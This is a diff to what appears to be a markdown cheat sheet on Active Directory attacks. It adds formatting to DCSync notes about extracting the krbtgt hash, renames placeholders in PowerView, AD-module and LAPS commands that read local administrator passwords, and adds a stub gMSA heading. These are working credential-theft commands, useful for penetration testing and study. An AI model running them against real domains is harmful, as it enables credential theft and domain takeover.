@@ -727,9 +727,9 @@ Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\
 
 ##### DCSync Attack
 
--   To extract credentials from the DC without code execution on it, we can use DCSync
--   To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain
--   By default, Domain Admins privileges are required to run DCSync
+-   To extract credentials from the DC without code execution on it, we can use `DCSync`
+-   To use the `DCSync` feature for getting `krbtgt` hash execute the below command with DA privileges for us domain
+-   By default, Domain Admins privileges are required to run `DCSync`
 
 ```powershell
 # Invoke-Mimikatz
@@ -1082,14 +1082,18 @@ Find-AdmPwdExtendedRights -Identity OUDistinguishedName
 
 ```powershell
 # Powerview
-Get-DomainObject -Identity <identity> | select - ExpandProperty ms-mcs-admpwd
+Get-DomainObject -Identity <targetmachine$> | select - ExpandProperty ms-mcs-admpwd
 
 # Active Directory module
-Get-ADComputer -Identity <identity> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
+Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
 
 # LAPS module
-Get-AdmPwdPassword -ComputerName <computrt-name>
+Get-AdmPwdPassword -ComputerName <targetmachine>
 ```
+
+### gMSA (group Managed Service Account)
+
+page 148
 
 ### MS Exchange
 
